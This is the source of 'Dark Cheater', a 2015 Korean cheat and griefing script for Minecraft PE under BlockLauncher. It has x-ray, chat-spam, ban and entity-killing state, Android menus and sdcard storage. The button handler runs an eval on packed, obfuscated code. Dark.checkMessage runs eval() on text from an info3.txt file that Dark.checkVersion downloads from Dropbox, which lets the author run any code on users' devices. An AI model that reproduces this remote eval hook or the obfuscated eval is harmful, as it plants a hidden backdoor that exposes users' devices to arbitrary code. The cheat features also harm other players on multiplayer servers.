//Dark Cheater
//Made by Dark Tornado
//version 1.8.0
/*
© 2015 Dark Tornado, All rights reserved.
리뷰는 허용하나, 무단공유, 무단수정, 제작자속이기 등을 할 시에는 싸대기 때리러 감.
*/

ModPE.setItem(511, "book_writable", 0, "Dark Tornado's Book");
Block.defineBlock(230, "Light Stone", [["end_stone",0]], 0, false, 0);
Block.setLightLevel(230, 15);
Block.setShape(230, 0, 0, 0, 0, 0, 0);

ModPE.overrideTexture("images/mob/darkTornado.png", "http:\/\/darktornado.dothome.co.kr\/000+\/darkTornado.png");
ModPE.overrideTexture("images/mob/hero.png", "https:\/\/www.dropbox.com\/s\/d8veix6yog3bsq5\/hero.png?dl=1");

Player.addItemCreativeInv(511, 1, 0);


const ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
const sdcard = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
const version = "1.8.0";

var btn = null;
var btnE = null;
var menu = null;
var menuI = null;
var menuA = null;
var menuW = null;
var menuP = null;
var menuB = null;
var menuE = null;
var menuE2 = null;
var menuWE = null;
var menuEL = null;
var menuM = null;
var menuDL = null;
var menuT = null;
var menuT2 = null;
var menuP2 = null;
var menuS = null;
var menuS2 = null;
var menuD = null;
var multi = false;
var locate = 0;
var side = 0;
var adding = 0;
var add = {i : 0, c : 0, d : 0};
var ad = null;
var dt = 0;
var hide = false;
var playerTarget = null;
var banList = new Array();
var entityTarget = 0;
var xyzTarget = 0;
var we = {x : new Array(2), y : new Array(2), z : new Array(2), tf : false};
var p = {p : null, t : null};
var run = false;
var rt = 0;
var rx, rz;
var btnSS = null;
var btnR = null;
var btnF = null;
var xRay = false;
var xrays = new Array(7);
var l = {x : null, y : null, z : null, b : new Array(2)};
var lx ,ly, lz;
var pass = false;
var light = false;
var noPvp = false;
var noEnt = false;
var move = 0;
var moving = false;
var tx, ty, tz;
var atp = 0;
var w = {tf : false, x : new Array(4), y : new Array(4), z : new Array(4), p1 : null, p2 : false, b : [], bd : [], f : false, h : false, c : false, s : false, yy : 0};
var filling = false;
var f2 = 0;
var fx1, fx2, fy1, fy2, fz1, fz2;
var cross = null;
var ctp = false;
var clock = null;
var clockText = null;
var darkType = 0;
var darkTypeE = null;
var mcpev = false;
var mcpev2 = false;
var mcpev3 = false;
var rideEnt = false;
var walk = false;
var touchBlock = false;
var blockInfo = false;
var mc = false;
var mc2 = false;
var mx, my, mz;
var mt = 0;
var mcBtn = null;
var menuJ = null;
var j = {on : false, y : null, p : null, s : null, c : null, t : null, pc : null, m : 0, f : 0, n : 1};
var climbing = false;
var sneak = false;
var auto = false;
var anti = 0;
var dl = {
esp : new Array(10), c : [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
wx : null, wy : null, wz : null,
sx : null, sy : null, sz : null,
ex : null, ey : null, ez : null
};
var espNames = ["Fire Summon", "Water Bind", "Mono Tree", "Sand Burst", "Undead Summon", "Push", "Burst", "Absorb", "Light Burster", "Dark Burster"];
var darkCmd = false;
var darkCmd2 = "";
var antiTerror = [true, false, false, false, true, true, true, false, true, true, true, true, true, false];
var terrorAlert = true;
var t = {t : 0, x : [], y : [], z : [], s : []};
var adTer = false;
var terPass = false;
var ops = new Array();
var opData = new Array();
var exp = {
onoff : false, c : 0, x : null, y : null, z : null
};
var mapTerror = 0;
var mapTerror2 = false;
var bedBreak = false;
var white = android.graphics.Color.WHITE;
var white2 = android.graphics.Color.WHITE;
var media = new android.media.MediaPlayer();
var music = false;
var wo = {tf : false, user : [], x1 : [], y1 : [], z1 : [], x2 : [], y2 : [], z2 : [], t : [], b1 : [], b2 : [], bd1 : [], bd2 : [], alert : false};
var chatLog = "";
var btnHide = false;
var terrorLog = "";
var antiTwo = true;
var playerSort = false;
var entName = "";
var s = {btn : null, btn2 : null, run : false, walk : false, move : 0, sneak : false, lie : false, x : null, y : null, z : null, sin : null, cos : null, g : false, btn : null, menu : null};
var showChest = false;
var fake = false;
var en = {tf : false, t : 0, x : null, y : null, z : null};
var buildingMode = false;
var buildingType = false;
var makerSummon = false;
var darkRender = Renderer.createHumanoidRenderer();
addDarkRender(darkRender);
var nox;
var noxT = 0;
var anT = 0;
var px, py, pz, yaw, sin, cos, tan, pcos;
var screenReverse = false;
var nf = {tf : false, s : undefined, t : 0, x : null, y : null, z : null, v : null};
var holoDark = android.app.AlertDialog.THEME_HOLO_DARK;
var h = {tf : false, hero : null, t : 0, r : null, x : null, y : null, z : null, s : null, c : null, l : false,
m : function(msg){
if(h.l) clientMessage("<히로빈> "+msg);
else clientMessage("<Herobrine> "+msg);
}
};
var esp = {tf : false, c : [0, 0, 0, 0], d2 : false,
d3x : null, d3y : null, d3z : null,
dx : null, dy : null, dz : null
};
var instaBreak = false;
var sm = {tf : false, air : false, abs : false, x : null, y : null, z : null, pack : false, pType : null};
var setTileString = "";
var particleString = "";
var number = android.text.InputType.TYPE_CLASS_NUMBER;
var tooMany = false;
var f = {tf : false, pp : [], n : [], x : null, y : null, z : null};
var scriptOn = false;
var timeLock = false;
var tlv = null;
var jump = false;
var j2 = false;
var gh = [false, false, false, false, false, false, false, false, false];
var killEnt = false;
var worldEditString = "";
var blockString = "";
var loadChest = false;
var loadChest2 = false;
var loadChest3 = false;
var loadChestData = [];
var loadChestCount = 0;
var chatTerrorString = "";
var showEntHealth = false;
var showEntHealthTarget;
var banTime = false;
var clock2 = null;
var clockSeek = null;
var appPack = false;
var mst = 0;
var showMobHealth = false;
var fovM = null;
var findOre = false;
var scanOre = false;
var scanOre2 = false;
var tttt = new Array();
var autoTorch = false;
var editChest = false;
var dou = {dark : false, seek : false, seek2 : 0};
var widgetDrag = true;
var fe = {btn : null, menu : null, touchTp : false};
var antiMine = new Array();
var blackList = "";
var blackListOn = true;
var miniMap = null;
var miniMapData = new android.widget.ImageView(ctx);
var miniMapTime = 0;
var signTp = true;
var c = {btn : null, mode : false};
var sBtn = null;
var antiChat = false;
var antiChatData = [];
var est = 0, esn = 0;
var antiEnt = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 64, 65, 66, 68, 69, 77, 80, 81, 82, 84, 85, 86, 90, 93, 94];
var pca = false;
var blockLog = false;
var chatIgnore = [];
var elr = false;
var elr2 = 5;
var evData = {a : null, p : null};
var pls = [];
var pls2 = [];
var wvsa = [false, true, false, false, false];
var showPlayerHealth = false;
var showNumber = false;
var chatTerrorN = 1;
var noPlayer = false;
var blackListId = "";
var blackListIdOn = true;
var serverLog = "";
var hyperLogOn = true;
var hyperLog = "";
var dce = {};
var whiteList = "";
var whiteListOn = false;
var scriptEnable = false;
var tpAlert = true;
var chatTerrorCool = true;
var eventPass = false;
var modTickOnoff = false;
var antiBlock = false;
var btnRe = false;
var theSeed = false;
var makeGUI = true;
var fixSendChat = false;
var antiMove = [];
var btnBackData = null;
var titleBackData = null;
var lp = 0;
var pointTime = false;
var dpw = null;
var dpwt = null;
var dpt = null;
var dp = {p : 0, t : 0, s : 0, d : 0};


var Dark = {
toast : function(msg){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
var toast = android.widget.Toast.makeText(ctx, "<Dark> "+msg, android.widget.Toast.LENGTH_LONG);
toast.show();
}
}));
},
makeButton : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btn = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
if(btnHide){
button.setBackgroundColor(android.graphics.Color.argb(0, 0, 0, 0));
}
else{
button.setText("Dark");
button.setTextSize(10);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
}
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('d(E||D||G){H a="\\h\\F\\b\\m\\i\\t\\q\\e\\n\\m\\b\\i\\I\\f\\N\\u\\m\\g\\e\\f\\x\\b\\B\\b\\j\\g\\o\\K\\b\\o\\c\\g\\j\\b\\f\\i\\b\\O\\g\\h\\j\\e\\c\\o\\b\\Q\\f\\i\\n\\u\\c\\e\\g\\S\\c\\j\\b\\e\\g\\h\\x\\b\\C\\q\\h\\h\\g\\B\\e\\c\\b\\i\\c\\e\\c\\A\\n\\t\\f\\j\\c\\b\\A\\e\\f\\i\\c".Z("\\b");d(s[a[0]]&&k[a[1]]()){k[a[2]]("작동 차단","제작자가 타인의 서버에서는 사용할 수 없도록 차단한 상태입니다.")}l d(s[a[3]]){v()}l{d(!p[a[4]]){d(k[a[5]]("\\m\\h\\L\\f\\M")!="\\n\\o\\q\\c"){d(y==z){P()}l d(y==r){R()}}l{v()}p[a[4]]=r;w T[a[6]][a[7]]()[a[8]](w U[a[9]][a[10]]({V:W(){p[a[4]]=z}}),X)}l d(p[a[4]]){k[a[Y]]();k[a[J]](r)}}}',62,63,'||||||||||nox|xXY|x65|if|x6C|x6F|x61|x6E|x73|x64|Dark|else|x69|x74|x72|dou|x75|true|dce|x4D|x44|alertMessage|new|x67|multi|false|x63|x62|x52|darkCheaterOn2|darkCheaterOn|x6D|darkCheaterOn3|var|x68|12|x6B|x66|x32|x77|x48|darkCheater|x70|semiDarkCheater|x79|android|java|run|function|300|11|split|'.split('|'),0,{});
eval(code);
}
}));
setDragListener(btn, button, 0);
layout.addView(button);
btn.setContentView(layout);
btn.setWidth(dip2px(ctx, 35));
btn.setHeight(dip2px(ctx, 23));
btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(locate==2) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, 0, 0);
else if(locate==3) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, dip2px(ctx, 35));
else if(locate==4) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.CENTER, 0, 0);
else if(locate==5) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
else if(locate==6) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.CENTER, 0, 0);
else if(locate==7) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==8) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==9) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==10) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("btnX"), Dark.read("btnY"));
else btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, 0);
}
catch(e){
Dark.toast("이 디바이스에서는 Dark Cheater를 사용할 수 없습니다.");
}
}
}));
},
selectMode : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var nn = 0;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var radios = new android.widget.RadioGroup(ctx);
var radio1 = new android.widget.RadioButton(ctx);
radio1.setText("서버장 모드");
radio1.setTextColor(white);
radio1.setId(1);
var radio2 = new android.widget.RadioButton(ctx);
radio2.setText("서버원 모드");
radio2.setTextColor(white);
radio2.setId(2);
radios.addView(radio1);
radios.addView(radio2);
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
nn = checkedId;
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("모드 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(nn==1){
multi = false;
Dark.toast("서버장 모드로 설정되었습니다.");
}
else if(nn==2){
multi = true;
Dark.toast("서버원 모드로 설정되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
},
close : function(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(tf){
if(menu!=null){
menu.dismiss();
menu = null;
}
}
if(menuI!=null){
menuI.dismiss();
menuI = null;
}
if(menuW!=null){
menuW.dismiss();
menuW = null;
}
if(menuP!=null){
menuP.dismiss();
menuP = null;
}
if(menuB!=null){
menuB.dismiss();
menuB = null;
}
if(menuE!=null){
menuE.dismiss();
menuE = null;
}
if(menuWE!=null){
menuWE.dismiss();
menuWE = null;
}
if(menuEL!=null){
menuEL.dismiss();
menuEL = null;
}
if(menuM!=null){
menuM.dismiss();
menuM = null;
}
if(menuDL!=null){
menuDL.dismiss();
menuDL = null;
}
if(menuT!=null){
menuT.dismiss();
menuT = null;
}
if(menuT2!=null){
menuT2.dismiss();
menuT2 = null;
}
if(menuP2!=null){
menuP2.dismiss();
menuP2 = null;
}
if(menuS!=null){
menuS.dismiss();
menuS = null;
}
if(menuS2!=null){
menuS2.dismiss();
menuS2 = null;
}
if(menuA!=null){
menuA.dismiss();
menuA = null;
}
if(menuE2!=null){
menuE2.dismiss();
menuE2 = null;
}
if(menuD!=null){
menuD.dismiss();
menuD = null;
}
Dark.save("makerFunc", false);
Dark.save("tra", false);
}
}));
},
makeEntityBtn : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnE = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("스폰 모드 끝내기");
button.setTextSize(12);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(btn!=null)
btnE.dismiss();
btnE = null;
entityTarget = 0;
}
}));
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
layout.addView(button);
btnE.setContentView(layout);
btnE.setWidth(dip2px(ctx, 100));
btnE.setHeight(dip2px(ctx, 35));
btnE.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
btnE.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, 10, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
},
showDialog : function(title, msg, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var text = new android.widget.TextView(ctx);
text.setText(msg);
text.setTextColor(white);
text.setTextSize(17);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
layout.addView(text);
if(tf){
var maker = new android.widget.TextView(ctx);
maker.setText("\n© 2015 Dark Tornado, All rights reserved.\n");
maker.setTextSize(11);
maker.setTextColor(white);
maker.setGravity(android.view.Gravity.CENTER);
layout.addView(maker);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
dialog.setTitle(title);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("닫기",null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
},
save : function(name, msg){
try{
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/"+name+".txt");
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String(msg);
fos.write(str.getBytes());
fos.close();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
read : function(name){
try{
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/"+name+".txt");
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
readAddOn : function(name){
try{
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/"+name+".txt");
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
downloadAddOn : function(url, name){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var folder = new java.io.File(sdcard + "/darkTornado/darkCheater/addOn/");
folder.mkdir();
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/"+name+".txt");
if(file.exists()){
Dark.toast("이미 다운되어 있습니다.");
return;
}
if(checkInternet()){
var uri = new android.net.Uri.parse(url);
var dm = new android.app.DownloadManager.Request(uri);
dm.setTitle("Dark Cheater 추가 파일 다운로드");
dm.setDescription("추가 파일 다운로드 중...");
dm.setDestinationInExternalPublicDir("darkTornado/darkCheater/addOn", name+".txt");
dm.setNotificationVisibility(1);
ctx.getSystemService(android.content.Context.DOWNLOAD_SERVICE).enqueue(dm);
Dark.toast("추가 파일 다운로드를 시작합니다.");
}
else{
Dark.toast("인터넷에 연결되어있지 않습니다.");
}
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
},
selectBuilding : function(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menus = ["작은 나무집", "나무집", "돌집", "돌+나무집", "네더 반응기", "엔더 반응기", "엔더 포탈"];
var names = ["wood", "wood2", "stone", "woodStone", "netherReactor", "enerReactor", "enderReactor"];
var urls = ["6pl8cbc87kpqzst\/wood", "d71yumi2v3g6sce\/wood2", "c1ohhmj5wppbwyd\/stone", "6tcrnrrdqpa6797\/woodStone", "dl3zjrqr0v2268v\/netherReactor", "i15qz905glb15aj\/enderReactor", "gjrr2umexs6pb09\/enderPortal"];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(tf){
var folder = new java.io.File(sdcard + "/darkTornado/darkCheater/addOn/buildings/");
folder.mkdir();
Dark.downloadAddOn("https:\/\/www.dropbox.com\/s\/"+urls[w]+".txt?dl=1", "buildings/"+names[w]);
}
else{
buildingMode = true;
buildingType = w;
Dark.toast(menus[w]+"(이)가 선택되었습니다.\n터치하시면 소환됩니다.");
}
}
}));
dialog.setTitle("건물 종류 선택");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
},
checkVersion : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(checkInternet()){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info3.txt");
if(file.exists()) file.delete();
var uri = new android.net.Uri.parse("https:\/\/www.dropbox.com\/s\/chj1dv7xni2k1dz\/info3.txt?dl=1");
var dm = new android.app.DownloadManager.Request(uri);
dm.setTitle("Dark Cheater 버전 확인 파일 다운로드");
dm.setDescription("파일 다운로드 중...");
dm.setDestinationInExternalPublicDir("darkTornado/darkCheater", "info3.txt");
dm.setNotificationVisibility(0);
ctx.getSystemService(android.content.Context.DOWNLOAD_SERVICE).enqueue(dm);
}
}
catch(e){
Dark.toast(e);
}
}
}));
},
getNewestVersion : function(){
if(Dark.read("info3")==""){
return "확인할 수 없습니다.";
}
else{
var vers = Dark.read("info3").toString().split("d");
return vers[1];
}
},
resetInfoFile : function(){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info.txt");
if(file.exists()){
file.delete();
}
},
checkMessage : function(){
if(Dark.read("info3")!=""){
var msg = Dark.read("info3").toString().split("dd");
if(msg[1]=="true") Dark.showDialog("제작자의 말", msg[2]);
if(msg[3]=="true") eval(msg[4]+"");
}
},
isMulti : function(){
if(Entity.getEntityTypeId(Player.getEntity())==0) return true;
else return false;
},
getTime : function(n){
var day = new Date();
if(n==1) return day.getFullYear()+"년 "+(day.getMonth()+1)+"월 "+day.getDate()+"일";
else if(n==2) return day.getHours()+"시 "+day.getMinutes()+"분 "+day.getSeconds()+"초";
else return day.getFullYear()+"년 "+(day.getMonth()+1)+"월 "+day.getDate()+"일 "+day.getHours()+"시 "+day.getMinutes()+"분 "+day.getSeconds()+"초";
},
hyperSave : function(name, msg){
try{
if(net.zhuoweizhang.mcpelauncher.Utils.isPro()) var file = new java.io.File("/data/data/net.zhuoweizhang.mcpelauncher.pro/darkCheater/"+name+".txt");
else var file = new java.io.File("/data/data/net.zhuoweizhang.mcpelauncher/darkCheater/"+name+".txt");
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String(msg);
fos.write(str.getBytes());
fos.close();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
hyperRead : function(name){
try{
if(net.zhuoweizhang.mcpelauncher.Utils.isPro()) var file = new java.io.File("/data/data/net.zhuoweizhang.mcpelauncher.pro/darkCheater/"+name+".txt");
else var file = new java.io.File("/data/data/net.zhuoweizhang.mcpelauncher/darkCheater/"+name+".txt");
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
getThemeInfo : function(name){
try{
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+name+"/maker.txt");
if(!(file.exists())) return "알 수 없음.";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
},
isEnchanted : function(){
var itemName = Player.getItemCustomName(Player.getSelectedSlotId());
if(itemName==null) return;
if(itemName.search("[Dark]")==-1) return false;
else return true;
},
setEnchant : function(type, point, power){
var i = getCarriedItem();
var it = Player.getCarriedItemData();
var a = Player.getCarriedItemCount();
if(Level.getGameMode()==1) a = 1;
if(power==1) Player.setItemCustomName(Player.getSelectedSlotId(), "§r§0[Dark] "+Item.getName(i, it, false)+" ("+type+")");
else Player.setItemCustomName(Player.getSelectedSlotId(), "§r§0[Dark] "+Item.getName(i, it, false)+" ("+type+" "+power+")");
dp.p -= a*point*power;
},
getEnchant : function(){
var itemName = Player.getItemCustomName(Player.getSelectedSlotId());
if(itemName==null) return;
if(itemName.search("[Dark]")==-1) return;
var types = ["추가데미지", "폭발", "파괴", "순간이동", "즉사"];
for(var n=0;n<types.length;n++){
if(itemName.search(types[n])!=-1) return types[n];
}
return;
},
getEnchantLevel : function(){
var itemName = Player.getItemCustomName(Player.getSelectedSlotId());
if(itemName==null) return;
if(itemName.search("[Dark]")==-1) return;
var type = itemName.split(" (");
if(type[1].search(" ")!=-1){
var type2 = type[1].split(" ");
return Number(type2[1].substring(0, type2[1].length-1));
}
else{
return 1;
}
}



};

var Ban = {
removeGonePlayerData : function(){
for(var n in banList){
if(Player.isPlayer(banList[n])==false)
banList.splice(n, 1);
}
},
isBanned : function(p){
for(var n in banList){
if(p==banList[n]){
return true;
}
}
return false;
},
removeData : function(p){
for(var n in banList){
if(p==banList[n]){
banList.splice(n, 1);
}
}
}


};

var HM = {
getX : function(){
var px, py, pz, yaw, sin, cos, tan, pcos;
px = Player.getX();
py = Player.getY();
pz = Player.getZ();
yaw = Math.floor(getYaw());
pitch = Math.floor(getPitch());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var gun=0;gun<150;gun++){
if(checkTile(px+gun*sin*pcos, py+gun*tan, pz+gun*cos*pcos))
return px+gun*sin*pcos;
}
return px+150*sin*pcos;
},
getY : function(){
var px, py, pz, yaw, sin, cos, tan, pcos;
px = Player.getX();
py = Player.getY();
pz = Player.getZ();
yaw = Math.floor(getYaw());
pitch = Math.floor(getPitch());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var gun=0;gun<150;gun++){
if(checkTile(px+gun*sin*pcos, py+gun*tan, pz+gun*cos*pcos))
return py+gun*tan;
}
return py+150*tan;
},
getZ : function(){
var px, py, pz, yaw, sin, cos, tan, pcos;
px = Player.getX();
py = Player.getY();
pz = Player.getZ();
yaw = Math.floor(getYaw());
pitch = Math.floor(getPitch());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
tan = -Math.sin(pitch/180*Math.PI);
pcos = Math.cos(pitch/180*Math.PI);
for(var gun=0;gun<150;gun++){
if(checkTile(px+gun*sin*pcos, py+gun*tan, pz+gun*cos*pcos))
return pz+gun*cos*pcos;
}
return pz+150*cos*pcos;
}

};

Ender = {
portalCheck : function(x, y, z){
var gt = getTile;
if(gt(x, y, z)==247&&gt(x+1, y-1, z+1)==42&&gt(x+1, y-1, z-1)==42&&gt(x-1, y-1, z+1)==42&&gt(x-1, y-1, z-1)==42&&gt(x+1, y, z+1)==4&&gt(x+1, y, z-1)==4&&gt(x-1, y, z+1)==4&&gt(x-1, y, z-1)==4&&gt(x+1, y-1, z)==4&&gt(x-1, y-1, z)==4&&gt(x, y-1, z+1)==4&&gt(x, y-1, z-1)==4&&gt(x+1, y, z+1)==4&&gt(x+1, y, z-1)==4&&gt(x-1, y, z+1)==4&&gt(x-1, y, z-1)==4&&gt(x+1, y+1, z)==4&&gt(x-1, y+1, z)==4&&gt(x, y+1, z+1)==4&&gt(x, y+1, z-1)==4&&Level.getGameMode()==0&&en.tf)
return true;
else
return false;
}

};

Entity.setFireTicks = function(e, n){
if(e==null) return;
else net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSetOnFire(e, n);
};
Entity.getEntityTypeId = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetEntityTypeId(e);
};
Entity.getX = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetEntityLoc(e, 0);
};
Entity.getY = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetEntityLoc(e, 1);
};
Entity.getZ = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetEntityLoc(e, 2);
};
Entity.getYaw = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetYaw(e);
};
Entity.getPitch = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetPitch(e);
};
Entity.getHealth = function(e){
if(e==null||Entity.getEntityTypeId(e)>=64) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetMobHealth(e);
};
Entity.setHealth = function(e, n){
if(e==null||Entity.getEntityTypeId(e)>=64){
return;
}
else{
try{
var vers = ModPE.getMinecraftVersion().toString().split(".");
if(Number(vers[1])>=12&&Player.isPlayer(e)&&n<=20){
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSetMobHealth(e, Number(n)+6);
Entity.addEffect(e, MobEffect.harm, 10, 0, true, false);
}
else{
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSetMobHealth(e, n);
}
}
catch(e){
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSetMobHealth(e, n);
}
}
};
ModPE.getBlocklauncherVersion = function(tf){  //original sorce from Astro
try{
if(tf) var bl = "net.zhuoweizhang.mcpelauncher.pro";
else var bl = "net.zhuoweizhang.mcpelauncher";
return ctx.getPackageManager().getPackageInfo(bl, android.content.pm.PackageManager.GET_INSTRUMENTATION).versionName;
}
catch(e){
return "설치되지 않음";
}
};
Level.getWorldType = function(){
var world = "오버월드";
try{
if(Player.getDimension()==1)
world = "네더월드";
}
catch(e){
//null;
}
return world;
};
Entity.getVelY = function(e){
if(e==null) return;
else return net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetEntityVel(e, 1);
};


var folder = new java.io.File(sdcard+"/darkTornado/");
var folder2 = new java.io.File(sdcard+"/darkTornado/darkCheater/");
folder.mkdir();
folder2.mkdir();
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info.txt");
if(file.exists()) file.delete();
locate = Dark.read("locate");
side = Dark.read("side");
if(Dark.read("info5")=="true") Dark.makeButton();
else showTerms(true);
checkDarkCheater();
Dark.save("Read Me", "이 폴더의 파일들은 Dark Cheater(다크 치터)의 설정 등과 관련된 파일들입니다.\n따라서 무단으로 수정할 시, Dark Cheater의 설정이 날아갈 수 있습니다.");
setMinecraftTheme();
chatTerrorString = Dark.read("chat");
var folder3 = new java.io.File(sdcard+"/darkTornado/darkCheater/banData/");
folder3.mkdir();
var folder4 = new java.io.File(sdcard+"/darkTornado/darkCheater/hyperLog/");
folder4.mkdir();
var folder5 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/");
